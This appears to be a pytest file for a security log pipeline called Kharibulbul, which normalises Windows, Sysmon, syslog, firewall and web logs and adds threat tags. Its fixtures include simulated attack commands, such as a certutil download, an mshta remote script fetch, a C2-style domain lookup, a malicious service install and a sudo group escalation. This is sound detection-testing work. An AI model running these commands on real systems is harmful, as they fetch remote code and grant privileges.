"""Parser + normaliser tests for every log family Kharibulbul understands."""
from __future__ import annotations

import json
from datetime import datetime, timezone

from kharibulbul.common.timeutil import parse_duration, parse_timestamp
from kharibulbul.simulate.scenarios import SECURITY, SYSMON, SYSTEM_SCM, Ctx, sysmon_network, sysmon_process, win_xml

TS = datetime(2026, 9, 27, 10, 0, 0, tzinfo=timezone.utc)


def _xml(source, event_id, data, computer="ws01"):
    return win_xml(source, event_id, computer, data, TS, 4242)


def test_timestamp_parsing_variants():
    assert parse_timestamp("2026-09-27T10:00:00.1234567Z").isoformat() == "2026-09-27T10:00:00.123456+00:00"
    assert parse_timestamp("Sep 27 10:00:00").month == 9
    assert parse_timestamp("27/Sep/2026:10:00:00 +0400").hour == 6
    assert parse_timestamp(1758967200).isoformat() == "2025-09-27T10:00:00+00:00"
    assert parse_timestamp(1758967200000).year == 2025  # milliseconds
    assert parse_timestamp("garbage") is None
    assert parse_duration("5m") == 300 and parse_duration("2h") == 7200 and parse_duration(15) == 15


def test_windows_4625_failed_logon(pipeline):
    data = {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
            "TargetUserSid": "S-1-0-0", "TargetUserName": "aysel", "TargetDomainName": "LAB", "Status": "0xc000006d",
            "FailureReason": "%%2313", "SubStatus": "0xC000006A", "LogonType": "3", "LogonProcessName": "NtLmSsp",
            "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI-LAB", "ProcessId": "0x0", "ProcessName": "-",
            "IpAddress": "10.10.99.10", "IpPort": "51234"}
    doc = pipeline.process({"raw": _xml(SECURITY, 4625, data), "dataset": "windows.security"})
    assert doc["event.code"] == "4625"
    assert doc["event.action"] == "logon-failed"
    assert doc["event.outcome"] == "failure"
    assert doc["event.category"] == "authentication"
    assert doc["user.name"] == "aysel" and doc["user.domain"] == "LAB"
    assert doc["source.ip"] == "10.10.99.10" and doc["source.port"] == 51234
    assert doc["winlog.logon.type"] == "network"
    assert doc["winlog.logon.failure.reason"] == "wrong password"
    assert doc["host.name"] == "ws01"
    assert doc["@timestamp"].startswith("2026-09-27T10:00:00")
    assert doc["winlog.record_id"] == 4242
    # enrichment: lab zone label from assets.yml / custom_ranges.csv and direction
    assert doc["source.geo.name"] == "Lab-Attacker"
    assert doc["kharibulbul.network.zone_direction"] == "internal"
    assert doc["host.role"] == "workstation"
    assert doc["kharibulbul.asset.criticality"] == "medium"


def test_windows_4688_process_created(pipeline):
    data = {"SubjectUserName": "aysel", "SubjectDomainName": "LAB", "NewProcessId": "0x1a2c", "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
            "TokenElevationType": "%%1938", "ProcessId": "0x9f8", "CommandLine": "certutil -urlcache -f http://x/y z", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "MandatoryLabel": "S-1-16-8192"}
    doc = pipeline.process({"raw": _xml(SECURITY, 4688, data)})
    assert doc["event.action"] == "process-created"
    assert doc["process.name"] == "certutil.exe"
    assert doc["process.pid"] == 0x1A2C and doc["process.parent.pid"] == 0x9F8
    assert doc["process.parent.name"] == "cmd.exe"
    assert doc["process.args"][0] == "certutil"


def test_sysmon_process_create(pipeline):
    ctx = Ctx(start=TS)
    data = sysmon_process(ctx, "C:\\Windows\\System32\\mshta.exe", "mshta.exe http://files.lab.test/a.hta", "C:\\Windows\\explorer.exe", "explorer.exe")
    doc = pipeline.process({"raw": _xml(SYSMON, 1, data)})
    assert doc["event.dataset"] == "windows.sysmon"
    assert doc["event.module"] == "windows"
    assert doc["event.provider"] == "Microsoft-Windows-Sysmon"
    assert doc["event.action"] == "process-created"
    assert doc["process.name"] == "mshta.exe"
    assert doc["process.parent.name"] == "explorer.exe"
    assert doc["user.name"] == "aysel" and doc["user.domain"] == "LAB"
    assert len(doc["process.hash.sha256"]) == 64
    assert doc["process.entity_id"].startswith("{")


def test_sysmon_network_connection(pipeline):
    ctx = Ctx(start=TS)
    data = sysmon_network(ctx, "System", "10.10.99.10", 40000, "10.10.20.10", 445, initiated=False, user="SYSTEM")
    doc = pipeline.process({"raw": _xml(SYSMON, 3, data)})
    assert doc["event.action"] == "network-connection"
    assert doc["event.category"] == "network"
    assert doc["network.direction"] == "inbound"
    assert doc["source.ip"] == "10.10.99.10" and doc["destination.port"] == 445
    assert doc["network.transport"] == "tcp"
    assert doc["network.type"] == "ipv4"
    assert "10.10.20.10" in doc["related.ip"]


def test_sysmon_dns_and_suspicious_tld(pipeline):
    data = {"RuleName": "-", "UtcTime": "2026-09-27 10:00:00.000", "ProcessGuid": "{1}", "ProcessId": "1", "QueryName": "c2.badlab.xyz",
            "QueryStatus": "0", "QueryResults": "::ffff:203.0.113.66;", "Image": "C:\\Users\\Public\\x.exe", "User": "LAB\\aysel"}
    doc = pipeline.process({"raw": _xml(SYSMON, 22, data)})
    assert doc["event.action"] == "dns-query"
    assert doc["dns.question.name"] == "c2.badlab.xyz"
    assert doc["dns.question.registered_domain"] == "badlab.xyz"
    assert "suspicious-tld" in doc["tags"]
    assert doc["dns.answers.data"] == ["203.0.113.66"]
    # threat intel enrichment from intel/domains.txt
    assert doc["threat.indicator.matched"] is True
    assert doc["threat.indicator.type"] == "domain-name"
    assert "threat-intel-match" in doc["tags"]
    assert doc["event.severity"] >= 75


def test_system_7045_service(pipeline):
    data = {"ServiceName": "EvilSvc", "ImagePath": "C:\\Windows\\Temp\\e.exe -k", "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"}
    doc = pipeline.process({"raw": _xml(SYSTEM_SCM, 7045, data)})
    assert doc["event.dataset"] == "windows.system"
    assert doc["event.action"] == "service-installed"
    assert doc["service.name"] == "EvilSvc" and doc["service.path"].startswith("C:\\Windows\\Temp")


def test_syslog_sshd_failed_password(pipeline):
    line = "Sep 27 10:00:01 srv-web01 sshd[2211]: Failed password for invalid user oracle from 10.10.99.10 port 40001 ssh2"
    doc = pipeline.process({"raw": line, "dataset": "linux.auth"})
    assert doc["event.action"] == "ssh-login-failed"
    assert doc["event.outcome"] == "failure"
    assert doc["user.name"] == "oracle"
    assert doc["source.ip"] == "10.10.99.10" and doc["source.port"] == 40001
    assert "invalid-user" in doc["tags"]
    assert doc["host.name"] == "srv-web01"
    assert doc["process.pid"] == 2211
    assert doc["network.protocol"] == "ssh"
    assert doc["host.role"] == "web-server"


def test_syslog_rfc5424_with_pri(pipeline):
    line = "<86>1 2026-09-27T10:00:00.000Z srv-web01 sshd 2211 - - Accepted publickey for ops from 10.10.20.33 port 5555 ssh2: ED25519 SHA256:abc"
    doc = pipeline.process({"raw": line})
    assert doc["event.action"] == "ssh-login-success"
    assert doc["log.syslog.facility.name"] == "authpriv"
    assert doc["log.syslog.severity.name"] == "informational"
    assert doc["kharibulbul.auth.method"] == "publickey"
    assert doc["@timestamp"].startswith("2026-09-27T10:00:00")


def test_ufw_block_line(pipeline):
    line = ("Sep 27 10:00:02 srv-web01 kernel: [12345.678] [UFW BLOCK] IN=eth0 OUT= MAC=00:11 SRC=10.10.99.10 DST=10.10.30.20 LEN=44 TOS=0x00 "
            "PREC=0x00 TTL=52 ID=1 PROTO=TCP SPT=40002 DPT=3306 WINDOW=1024 RES=0x00 SYN URGP=0")
    doc = pipeline.process({"raw": line, "dataset": "linux.firewall"})
    assert doc["event.action"] == "firewall-block"
    assert doc["event.type"] == "denied"
    assert doc["destination.port"] == 3306 and doc["source.ip"] == "10.10.99.10"
    assert doc["network.transport"] == "tcp"
    assert doc["event.dataset"] == "linux.firewall"


def test_sudo_and_account_management(pipeline):
    doc = pipeline.process({"raw": "Sep 27 10:00:03 srv-web01 sudo[3001]: aysel : TTY=pts/0 ; PWD=/home/aysel ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo kbtest"})
    assert doc["event.action"] == "sudo-command" and doc["event.outcome"] == "success"
    assert doc["user.name"] == "aysel" and doc["user.effective.name"] == "root"
    assert doc["process.name"] == "usermod"
    doc = pipeline.process({"raw": "Sep 27 10:00:04 srv-web01 usermod[3002]: add 'kbtest' to group 'sudo'"})
    assert doc["event.action"] == "group-member-added" and doc["group.name"] == "sudo" and doc["user.target.name"] == "kbtest"
    doc = pipeline.process({"raw": "Sep 27 10:00:05 srv-web01 useradd[3003]: new user: name=kbtest, UID=1002, GID=1002, home=/home/kbtest, shell=/bin/bash"})
    assert doc["event.action"] == "user-created" and doc["user.target.name"] == "kbtest"
    doc = pipeline.process({"raw": "Sep 27 10:00:06 srv-web01 sudo[3004]: aysel : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/aysel ; USER=root ; COMMAND=/bin/bash"})
    assert doc["event.action"] == "sudo-command" and doc["event.outcome"] == "failure"


def test_su_switch_user(pipeline):
    """Lines as journald records them (Ubuntu, util-linux su): one mistyped password is one authentication failure."""
    def su(msg):
        return pipeline.process({"raw": f"Sep 30 19:43:26 ubuntu-wsl su[1379]: {msg}"})

    ok = [su("(to user2) user1 on pts/2"),
          su("pam_unix(su-l:session): session opened for user user2(uid=1001) by (uid=1000)"),
          su("pam_systemd(su-l:session): Failed to check if /run/user/1001/bus exists, ignoring: Permission denied"),
          su("pam_unix(su-l:session): session closed for user user2")]
    assert [d["event.action"] for d in ok] == ["su-success", "su-session-opened", "su-message", "su-session-closed"]
    assert ok[0]["event.category"] == "authentication" and ok[0]["event.outcome"] == "success"
    assert ok[0]["user.name"] == "user1" and ok[0]["user.effective.name"] == "user2"
    assert ok[1]["user.effective.name"] == "user2" and ok[3]["event.category"] == "session"

    bad = [su("pam_unix(su-l:auth): authentication failure; logname= uid=1000 euid=0 tty=/dev/pts/2 ruser=user1 rhost=  user=user2"),
           su("FAILED SU (to user2) user1 on pts/2")]
    assert [d["event.action"] for d in bad] == ["su-pam-auth-failure", "su-failed"]
    assert bad[0]["user.name"] == "user1" and bad[0]["user.effective.name"] == "user2"
    assert bad[1]["user.name"] == "user1" and bad[1]["user.effective.name"] == "user2"

    def failures(docs):
        return [d for d in docs if d["event.category"] == "authentication" and d["event.outcome"] == "failure"]
    assert failures(ok) == [] and failures(bad) == [bad[1]]

    # shadow-utils wording
    assert su("Successful su for root by aysel")["event.action"] == "su-success"
    doc = su("FAILED su for root by aysel")
    assert doc["event.action"] == "su-failed" and doc["user.name"] == "aysel" and doc["user.effective.name"] == "root"


def test_nginx_combined(pipeline):
    line = '10.10.99.10 - - [27/Sep/2026:10:00:00 +0000] "GET /wp-login.php?x=1 HTTP/1.1" 404 512 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'
    doc = pipeline.process({"raw": line, "dataset": "nginx.access"})
    assert doc["event.category"] == "web"
    assert doc["http.request.method"] == "GET" and doc["http.response.status_code"] == 404
    assert doc["url.path"] == "/wp-login.php" and doc["url.query"] == "x=1"
    assert "scanner-user-agent" in doc["tags"]
    assert doc["event.outcome"] == "failure"


def test_journald_json(pipeline):
    obj = {"__REALTIME_TIMESTAMP": "1790000000000000", "_HOSTNAME": "srv-web01", "SYSLOG_IDENTIFIER": "sshd", "_PID": "77", "PRIORITY": "6",
           "MESSAGE": "Failed password for root from 10.10.99.10 port 4444 ssh2"}
    doc = pipeline.process({"raw": json.dumps(obj)})
    assert doc["kharibulbul.pipeline.parser"] == "journald"
    assert doc["event.action"] == "ssh-login-failed" and doc["user.name"] == "root"
    assert doc["event.dataset"] == "linux.auth"


def test_ecs_json_passthrough(pipeline):
    obj = {"@timestamp": "2026-09-27T10:00:00Z", "event": {"dataset": "custom.app", "action": "order-created"}, "user": {"name": "Leyla"}, "message": "hi"}
    doc = pipeline.process({"raw": json.dumps(obj)})
    assert doc["event.dataset"] == "custom.app" and doc["event.action"] == "order-created"
    assert doc["user.name"] == "Leyla"
    assert doc["event.module"] == "custom"


def test_windows_firewall_log(pipeline):
    line = "2026-09-27 10:00:00 DROP TCP 10.10.99.10 10.10.20.10 51000 445 52 S 0 0 0 - - - RECEIVE"
    doc = pipeline.process({"raw": line, "dataset": "windows.firewall_log"})
    assert doc["event.action"] == "firewall-block"
    assert doc["network.direction"] == "inbound"
    assert doc["destination.port"] == 445


def test_generic_fallback(pipeline):
    doc = pipeline.process({"raw": "ERROR [2026-09-27T10:00:00Z] something broke host=10.1.1.1 code=42"})
    assert doc["kharibulbul.pipeline.parser"] == "generic"
    assert doc["log.level"] == "error"
    assert doc["extracted.code"] == "42"
    assert "10.1.1.1" in doc["related.ip"]


def test_empty_and_unparseable_lines_are_dropped(pipeline):
    assert pipeline.process({"raw": "   "}) is None
    assert pipeline.process({"raw": "", "dataset": "x"}) is None
